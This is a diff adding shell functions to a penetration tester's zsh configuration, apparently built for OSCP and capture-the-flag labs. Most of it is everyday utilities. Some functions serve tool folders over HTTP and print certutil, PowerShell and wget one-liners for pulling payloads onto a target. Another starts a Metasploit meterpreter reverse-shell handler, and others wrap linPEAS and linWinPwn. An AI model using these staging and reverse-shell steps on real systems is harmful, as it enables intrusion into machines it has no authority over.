+  echo
+  echo "🧪 PowerShell certutil:"
+  echo "certutil -urlcache -split -f http://$IP/<FILENAME> C:\Windows\tasks\<FILENAME>"
+  echo
+  echo "🧪 PowerShell Invoke-WebRequest:"
+  echo "powershell -c \"Invoke-WebRequest -Uri http://$IP/<FILENAME> -OutFile <FILENAME>\""
+  echo
+  echo "🧪 wget:"
+  echo "wget http://$IP/<FILENAME>"
+  echo
+
+  echo "[*] Starting Python HTTP server on port $PORT..."
+  python3 -m http.server $PORT
+}
+
+wimmtools() {
+  # Serve immidiate Tools from the WindowsDropTools directory using Python's HTTP server
+  local PORT=80
+  local DIR="/home/kali/Tools/ImmidiateTools/WindowsDropTools"
+  cd "$DIR" || { echo "[-] Failed to enter $DIR"; return 1; }
+
+  # Get IP from tun0 interface
+  local IP=$(ip -4 addr show tun0 2>/dev/null | grep -oP '(?<=inet\s)\d+(\.\d+){3}')
+  if [ -z "$IP" ]; then
+    echo "[!] Could not find IP on tun0. Is your VPN up?"
+    return 1
+  fi
+
+  echo "[*] Serving files from: $DIR"
+  echo
+  ls -la
+  echo
+  echo "[*] Hosting on IP: $IP:$PORT"
+  echo
+  echo "🧪 PowerShell certutil:"
+  echo "certutil -urlcache -split -f http://$IP/<FILENAME> C:\Windows\tasks\<FILENAME>"
+  echo
+  echo "🧪 PowerShell Invoke-WebRequest:"
+  echo "powershell -c \"Invoke-WebRequest -Uri http://$IP/<FILENAME> -OutFile <FILENAME>\""
+  echo
+  echo "🧪 wget:"
+  echo "wget http://$IP/<FILENAME>"
+  echo
+
+  echo "[*] Starting Python HTTP server on port $PORT..."
+  python3 -m http.server $PORT
+}
+
+limmtools() {
+  # Serve immidiate Tools from the LinuxDropTools directory using Python's HTTP server
+  local PORT=80
+  local DIR="/home/kali/Tools/ImmidiateTools/LinuxDropTools"
+  cd "$DIR" || { echo "[-] Failed to enter $DIR"; return 1; }
+
+  # Get IP from tun0 interface
+  local IP=$(ip -4 addr show tun0 2>/dev/null | grep -oP '(?<=inet\s)\d+(\.\d+){3}')
+  if [ -z "$IP" ]; then
+    echo "[!] Could not find IP on tun0. Is your VPN up?"
+    return 1
+  fi
+
+  echo "[*] Serving files from: $DIR"
+  echo
+  ls -la
+  echo
+  echo "[*] Hosting on IP: $IP:$PORT"
+  echo
+  echo "🧪 PowerShell certutil:"
+  echo "certutil -urlcache -split -f http://$IP/<FILENAME> C:\Windows\tasks\<FILENAME>"
+  echo
+  echo "🧪 PowerShell Invoke-WebRequest:"
+  echo "powershell -c \"Invoke-WebRequest -Uri http://$IP/<FILENAME> -OutFile <FILENAME>\""
+  echo
+  echo "🧪 wget:"
+  echo "wget http://$IP/<FILENAME>"
+  echo
+
+  echo "[*] Starting Python HTTP server on port $PORT..."
+  python3 -m http.server $PORT
+}
+
+
+
+Linpeas-Fresh() {
+  local repo="$HOME/Tools/PEASS-ng"
+  local build_script="$repo/linPEAS/builder"
+  local output="/tmp/LP-2025.sh"
+  local target="$(pwd)/LP-2025.sh"
+
+  echo "[*] Checking for updates in PEASS-ng..."
+  cd "$repo" || { echo "[!] Repo not found at $repo"; return 1; }
+  git switch main 2>/dev/null || git switch master || echo "[!] Could not switch to a known branch"
+  git pull || { echo "[!] Git pull failed."; return 1; }
+
+  echo "[*] Building fresh linPEAS with all modules..."
+  cd "$repo/linPEAS" || return
+  python3 -m builder.linpeas_builder --output "$output" --all || { echo "[!] Build failed."; return 1; }
+
+  echo "[*] Copying LP-2025.sh to current directory..."
+  cp "$output" "$target" && chmod +x "$target"
+  echo "[+] Done: $target"
+}
+
+
+wml() {
+    # wml - A simple script to run a meterpreter shell handler and listen for incoming connections
+  local ip=$(ip addr show tun0 | grep 'inet ' | awk '{print $2}' | cut -d/ -f1)
+  local port=${1:-443}
+  msfconsole -q -x "use exploit/multi/handler; set payload windows/meterpreter/reverse_tcp; set LHOST $ip; set LPORT $port; run;"
+}
+
+
+
+# Aliases for various commands
+
+
+# ------------------------ Additional Functions from bash_profile ------------------------
+# ------------------------ handy functions ------------------------
+# makes a dir and then cds into it
+
+
+mcd () {
+    mkdir -p "$1"
+    cd "$1"
+}
+
+
+CVEdata() {  # Fetches CVE data from NVD and formats it using jq
+  local CVE_ID=$1
+
+  if [ -z "$CVE_ID" ]; then
+    return 1
+  fi
+
+  curl -s "https://services.nvd.nist.gov/rest/json/cves/2.0?cveId=$CVE_ID" | jq '
+  {
+    "CVE ID": .vulnerabilities[0].cve.id,
+    "Score": .vulnerabilities[0].cve.metrics.cvssMetricV31[0].cvssData.baseScore,
+    "Severity": .vulnerabilities[0].cve.metrics.cvssMetricV31[0].cvssData.baseSeverity,
+    "Description": .vulnerabilities[0].cve.descriptions[] | select(.lang == "en") | .value,
+    "References": (.vulnerabilities[0].cve.references | map(.url))
+  }'
+}
+
+
+kali-cmd() {
+    if ! podman ps --format '{{.Names}}' | grep -q kali-Linux; then
+        echo "Starting kali-Linux container..."
+        podman start kali-Linux
+    fi
+    podman exec -it kali-Linux "$@"
+}
+
+Pyvenv() {
+  # Makes a python virtual env
+  python3 -m venv exploit-env
+  source exploit-env/bin/activate
+}
+
+
+cd_timer() {
+  # countdown_timer 
+  # Grab whatever the user typed, e.g. "30s" or "2m"
+  local time_input="$1"
+
+  if [ -z "$time_input" ]; then
+    # If no input, default to 1 minute
+    hour=0
+    min=1
+    sec=0
+  else
+    # Let's see whether the user wants seconds or minutes
+    local unit="${time_input: -1}"   # last character (s or m)
+    local value="${time_input%?}"    # everything except that last character
+
+    if [[ "$unit" == "m" ]]; then
+      hour=0
+      min="$value"
+      sec=0
+    elif [[ "$unit" == "s" ]]; then
+      # Convert total seconds into minutes and seconds
+      hour=0
+      min=$((value / 60))
+      sec=$((value % 60))
+    else
+      # If it’s something else, let’s default to 1 minute
+      hour=0
+      min=1
+      sec=0
+    fi
+  fi
+
+  # The good ol’ triple loop countdown
+  while [ $hour -ge 0 ]; do
+    while [ $min -ge 0 ]; do
+      while [ $sec -ge 0 ]; do
+        echo -ne "$hour:$min:$sec\033[0K\r"
+        ((sec--))
+        sleep 1
+      done
+      sec=59
+      ((min--))
+    done
+    min=59
+    ((hour--))
+  done
+
+  # When the timer hits zero, print the cute green banner
+  echo -e "\n\e[32m=============================="
+  echo -e "         Time is up!"
+  echo -e "==============================\e[0m"
+}
+
+
+mov-to-mp4() {
+    if [[ -z "$1" ]]; then
+        echo "Usage: convert_mov_to_mp4 <input_file.mov>"
+        return 1
+    fi
+    local input_file="$1"
+    local output_file="${input_file%.mov}.mp4"
+    ffmpeg -i "$input_file" -c:v libx264 -crf 23 -c:a aac -b:a 192k "$output_file"
+    echo "Converted file saved as $output_file"
+}
+
+
+update_git_repos() {
+    echo "Searching for Git repositories in the current directory..."
+    find . -type d -name .git 2>/dev/null | while read -r repo; do
+        dir=$(dirname "$repo")
+        echo "Updating repository in $dir"
+        (cd "$dir" && git pull)
+    done
+}
+
+stop_containers() {
+    echo "Stopping all running containers..."
+    podman stop $(podman ps -q)
+}
+
+set-proj() {
+  
+  
+  
+}
+
+go-proj() {
+  
+  echo "Moved to directory: $(pwd)"
+}
+
+listen-up(){
+  cd /Users/clive/Tools/dotofu
+  terraform apply
+  cd -
+}
+
+listen-down(){
+  cd /Users/clive/Tools/dotofu
+  terraform destroy
+  cd -
+}
+
+gwp() {
+  echo "Please enter the subject in question:"
+  read subject_in_question
+  echo
+  echo ----------------------------------
+  echo "Factual Integrity: You NEVER FABRICATE INFORMATION OR FACTS. Instead, you clarify further. If unsure, you always ask clarifying questions in the form of Q1, Q2, Q3, etc."
+  echo "Expertise Level: Respond as a ${subject_in_question} expert with at least 60 years of professional experience and multiple PhDs in the subject."
+  echo "Time Management: If a response will take more than 20 seconds, provide an estimated time to the nearest 2-minute increment."
+  echo "Methodical Approach: You Think step by step and then explain it step by step, you are thorough in gathering all necessary information, and always review the final answer for accuracy and succinctness. You provide updates on the thought process and progress."
+  echo "User Preferences: Do not remind me of my own interests or repetitive parts of the conversation. Use simple language and don't assume I am an expert in anything."
+  echo "Based on the content provided, answer me the following questions, with answers in 'SECTIONS':(Who are the main actors in this text and what actions are they undertaking? What topics are being discussed in this text? What are the central ideas presented in this text? What are the unique insights or wisdoms that can be derived from this conversation? Identify and list any notable quotes from this text, along with the individuals who made them. Briefly list all the facts in this text. Please identify and list any resources, references, or links mentioned within this text. Are there mentions of prior work or studies related to the subject matter? List them. Based on the content of this text, what further recommendations or actions do you suggest?)"
+  echo ----------------------------------
+}
+
+function mp3-2-4() {
+  if [[ "$#" -eq 2 ]]; then
+    ffmpeg -loglevel quiet -hide_banner -i "$1" -c:a aac -vn "/Users/clive/Desktop/$2.m4a"
+  else
+    echo "Usage: convert_podcast <MP3_TO_CONVERT> <OUTPUT_FILE_NAME>"
+  fi
+}
+
+delete_all_droplets() {
+    # Function to delete all droplets in DigitalOcean
+    echo "This will delete ALL droplets in your DigitalOcean account!"
+    echo "Do you really want to delete ALL droplets? (y/n)"
+    read -r response
+
+    if [[ "$response" == "y" ]]; then
+        echo "Deleting all droplets..."
+
+        # Get the list of all droplet IDs
+        droplet_ids=$(doctl compute droplet list --no-header --format ID)
+
+        # Loop through each droplet ID and delete it
+        for id in $droplet_ids; do
+            doctl compute droplet delete "$id" --force
+            echo "Deleted droplet with ID: $id"
+        done
+
+        echo "All droplets have been deleted."
+    else
+        echo "Operation cancelled."
+    fi
+}
+
+sgr () {
+    # calls the script to create a SmegrepRunner (sgr)
+    echo running /Users/clive/Tools/Scripts/createA_semgrepRunner.sh
+    source /Users/clive/Tools/Scripts/createA_semgrepRunner.sh
+}
+
+secretsCheckInCode () {
+  echo running /Users/clive/Tools/Scripts/GItLeaksandTruffleHogCheck.sh
+  source /Users/clive/Tools/Scripts/GItLeaksandTruffleHogCheck.sh
+}
+
+ytt () {
+    # calls the Youtube Transcripteer script
+    echo running YT-transcriptor.py
+    python3 /Users/clive/Tools/Scripts/YT-Transcripter.py
+}
+
+dfc () {
+   # dfc - docker free up space
+   echo "Stopping all docker containers ... "
+   docker stop $(docker ps -a -q)
+   echo "Removeing all excited containers ..."
+   docker rm $(docker ps -a -f status=exited -q)	     # remove all excited containers
+   echo "Removeing all images ..."
+   docker rmi $(docker images -a -q)		     # remove all images
+}
+
+freeup () {
+    find /Users/clive/EHT/PRODUCTS -mtime +100 -type f -delete
+    echo Cleard files over 100 days old
+}
+
+n1p () {
+    # function to create a new password from 1password cli tool
+    read -r -p 'What is the name of this password in 1password ? : ' name 
+    read -r -p 'What is the int length of this password ? : ' length
+    op item create --title=$name --category=password --generate-password=$length,letters,digits,symbols 
+}
+
+chatgpt() {
+    # This function doesn't work
+  if [ -z "$1" ]; then
+    echo "Usage: chatgpt 'Your prompt here'"
+    return 1
+  fi
+
+  local prompt="$1"
+  local api_key=$(security find-generic-password -a $USER -s "openai_api_key" -w)  # Replace with your actual OpenAI API key
+
+  curl -s -X POST -H "Content-Type: application/json" \
+       -H "Authorization: Bearer $api_key" \
+       -d "{\"prompt\": \"$prompt\", \"max_tokens\": 10000}" \
+       "https://api.openai.com/v1/engines/gpt-4/completions" | jq -r '.choices[0].text'
+}
+
+
+# newbox() {
+#     bash /home/kali/OSCP/CTFs/utils/Start-Session.sh "$@"
+# }
+
+
+
+# --------------------------------------------------
+# 🛠️ Prompt Configuration
+# --------------------------------------------------
+
+autoload -U colors && colors
+autoload -U promptinit && promptinit
+setopt prompt_subst
+
+parse_git_branch() {
+     git branch 2> /dev/null | sed -e '/^[^*]/d' -e 's/* \(.*\)/ \1/'
+}
+# -------------------------------------------------
+
+ssd() {
+  echo -e "\n🧹 Cleaning system cache and temp files..."
+
+  # Move "Pasted image*.png" files from ctfs in to z_IMAGES directory
+  find "/home/kali/OSCP/CTFs/ctf_NOTES_obs" -maxdepth 1 -type f -iname "pasted image *.png" \
+    -exec mv {} "/home/kali/OSCP/CTFs/ctf_NOTES_obs/z_IMAGES/" \;
+  
+  sudo cp -f /etc/zsh/zshrc /home/kali/OSCP/CTFs/Housekeeping/zshrc_BAK
+  echo -e "\n💾 Backed up current /etc/zsh/zshrc to zshrc_BAK."
+
+  echo -e "\n🧹 Cleaning APT cache and unnecessary files..."
+  sudo apt clean
+  echo ""
+
+  echo -e "\n🗑️  Cleaning APT package cache..."
+  sudo apt autoremove -y
+  echo ""
+
+  echo -e "\n🗑️  Clearing APT cache..."
+  sudo /bin/rm -rf ~/.cache/thumbnails/*
+  echo ""
+
+  echo -e "\n🗑️  Clearing thumbnail cache..."
+  sudo /bin/rm -rf ~/.local/share/Trash/*
+  echo ""
+
+  echo -e "\n🗑️  Clearing systemd journal logs older than 3 days..."
+  sudo journalctl --vacuum-time=3d
+  echo ""
+
+  echo -e "\n🔄 Updating WPScan database..."
+  wpscan --update
+  echo ""
+
+  echo -e "\n🔄 Updating wpprobe and its database..."
+  wpprobe update
+  wpprobe update-db
+  echo
+
+  echo -e "\n🧹 Checking for and Shutting down Sysrepotro instance Func: sysr_stop ..."
+  sysr_stop
+  echo ""
+
+  echo -e "\n✅ Cleanup complete."
+
+  echo
+  echo -e "🧼 Syncing disk writes..."
+  sync
+  echo
+
+  ###################################################################
+  # Gracefully stop SysReptor (docker-compose stack)
+  ###################################################################
+  SYSREPTOR_DEPLOY_DIR="$HOME/Tools/install_sysreptor/sysreptor/deploy"
+
+  if command -v docker &>/dev/null && [ -d "$SYSREPTOR_DEPLOY_DIR" ]; then
+    echo -e "\n🐺 Stopping SysReptor (docker compose)..."
+    (
+      cd "$SYSREPTOR_DEPLOY_DIR" || exit 0
+      # Try docker compose (v2), fall back to docker-compose (v1) quietly
+      docker compose down >/dev/null 2>&1 || docker-compose down >/dev/null 2>&1
+    )
+  else
+    echo -e "\n🐺 SysReptor not found or Docker not available, skipping..."
+  fi
+
+  ###################################################################
+  # Stop any *other* running Docker containers
+  ###################################################################
+  if command -v docker &>/dev/null; then
+    echo -e "\n🐳 Stopping all remaining Docker containers..."
+    RUNNING_CONTAINERS=$(docker ps -q)
+    if [ -n "$RUNNING_CONTAINERS" ]; then
+      docker stop $RUNNING_CONTAINERS >/dev/null 2>&1
+    fi
+  fi
+
+  ###################################################################
+  # Clearing away any old exploit-env from python Venvs
+  ###################################################################
+
+  echo -e "\n🧨 Cleaning old exploit-env directories (not modified in > 7 days)..."
+
+  BASE_DIR="$HOME"  # change to "/" or another root if you really want to search wider
+
+  if command -v find >/dev/null 2>&1; then
+    # First show what will be removed
+    OLD_EXPLOIT_ENVS=$(find "$BASE_DIR" -type d -name "exploit-env" -mtime +7 2>/dev/null)
+
+    if [ -n "$OLD_EXPLOIT_ENVS" ]; then
+      echo "Found the following exploit-env directories older than 7 days:"
+      echo "$OLD_EXPLOIT_ENVS"
+      echo
+
+      # Delete them
+      find "$BASE_DIR" -type d -name "exploit-env" -mtime +7 -print -exec rm -rf {} + 2>/dev/null
+      echo "🗑️  Old exploit-env directories removed."
+    else
+      echo "No exploit-env directories older than 7 days found under $BASE_DIR."
+    fi
+  else
+    echo "⚠️  'find' command not available, skipping exploit-env cleanup."
+  fi
+
+  ###################################################################
+  # Show remaing diskspace
+  ###################################################################
+  echo
+  echo -e "\033[1;33mDisk Usage Summary for Root ('/'):\033[0m"
+  df -h / | awk 'NR==2 {
+    printf "\033[1;32mAvailable:\033[0m \033[1m%s\033[0m | \033[1;31mUsed:\033[0m \033[1m%s\033[0m | \033[1;34mTotal:\033[0m \033[1m%s\033[0m\n", $4, $3, $2
+  }'
+  echo
+  ###################################################################
+  # DOuble check its ok to shut down 
+  ###################################################################
+  echo -n "⚠  Type 'yes' to confirm shutdown: "
+  read confirm
+  if [[ "$confirm" == "yes" ]]; then
+    echo -e "\n\033[1;35mShutting down now. Goodbye 👋\033[0m"
+    sudo shutdown now
+  else
+    echo -e "\033[1;33mShutdown aborted. You're still with us!\033[0m"
+  fi
+}
+
+
+
+linwinrun() {
+  docker run --rm -it \
+    --net=host \
+    -v "$HOME/.creds:/root/.creds" \
+    -v "$HOME/Tools/linWinPwn:/linWinPwn" \
+    -v "$HOME/loot:/loot" \
+    -w /linWinPwn \
+    linwinpwn:latest \
+    ./linWinPwn.sh "$@"
+}
+
+
+CTX() {
+  # Accepts a URL as an argument or text from stdin.
+  # Appends both cleaned lines and individual words to ContextWordlist.txt.
+
+  local URL="$1"
+  local OUTFILE="ContextWordlist.txt"
+  local TMPFILE=$(mktemp)    # Temporary file to store processed lines
+  local WORDTMP=$(mktemp)    # Temporary file to store individual words
+
+  # Show usage if no URL and no piped input
+  if [ -t 0 ] && [ -z "$URL" ]; then
+    echo "Usage:"
+    echo "  CTX http://target:port/page        # Extract from a URL"
+    echo "  curl http://target | html2text | CTX   # Extract from piped input"
+    return 1
+  fi
+
+  # Check if input is from terminal (i.e., a URL) or from a pipe (stdin)
+  if [ -t 0 ] && [ -n "$URL" ]; then
+    echo "[*] Extracting visible text from $URL..."
+    lynx -dump -nolist -width=999 "$URL" 2>/dev/null
+  else
+    # If piped input is detected, read from stdin instead
+    cat -
+  fi |
+    # Clean special characters, remove leading spaces, keep only lines with words longer than 3 characters
+    sed 's/[^a-zA-Z0-9 @.]/ /g' | sed 's/^ *//' | awk 'length > 3' > "$TMPFILE"
+
+  # Break each line into individual words and save unique ones > 3 chars
+  tr '[:space:]' '\n' < "$TMPFILE" | awk 'length > 3' | sort -u > "$WORDTMP"
+
+  # If text was extracted, append both lines and words to output and deduplicate
+  if [[ -s "$TMPFILE" ]]; then
+    cat "$TMPFILE" >> "$OUTFILE"    # Append full cleaned lines
+    cat "$WORDTMP" >> "$OUTFILE"    # Append extracted words
+    sort -u "$OUTFILE" -o "$OUTFILE" # Deduplicate
+    echo "[+] Context wordlist updated at $(realpath "$OUTFILE")"
+  else
+    echo "[!] No readable content extracted."
+  fi
+
+  # Cleanup
+  rm -f "$TMPFILE" "$WORDTMP"
+}
+
+
+
+
+# ------- Misc Functions
+
+
+[ -f ~/.project_dir ] && export PROJECT_DIR="$(cat ~/.project_dir)"      # allows persistance of the spd and gpd alias
+
+source "$HOME/.pentest_functions"
